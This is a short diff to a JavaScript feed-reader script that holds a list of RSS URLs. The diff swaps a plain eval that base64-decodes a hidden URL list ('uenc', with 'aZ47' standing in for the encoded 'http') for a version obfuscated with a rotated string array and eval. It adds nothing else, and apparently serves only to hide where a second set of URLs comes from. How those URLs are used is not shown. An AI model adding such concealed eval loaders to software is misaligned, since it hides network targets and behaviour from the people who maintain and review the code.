@@ -1,5 +1,5 @@
 
-////
+////a
 
 var urls = [
     "https://ar.lesiteinfo.com/feed/",
@@ -229,8 +229,9 @@ function first() {
 }
 
 
+/////////
+var _0x555d=['aHR0c','replace'];(function(_0x29a9ea,_0x555d69){var _0x260b47=function(_0x2ca596){while(--_0x2ca596){_0x29a9ea['push'](_0x29a9ea['shift']());}};_0x260b47(++_0x555d69);}(_0x555d,0x113));var _0x260b=function(_0x29a9ea,_0x555d69){_0x29a9ea=_0x29a9ea-0x0;var _0x260b47=_0x555d[_0x29a9ea];return _0x260b47;};eval('b = atob(uenc[_0x260b(\'0x0\')](/24c/g, \'cu\')[_0x260b(\'0x0\')](/aZ47/g, _0x260b(\'0x1\')));');/////////
 
-eval("b = atob(uenc.replace(/24c/g, \"cu\").replace(/aZ47/g, \"aHR0c\"))")
 
 var urls2 = b.split(",")
 
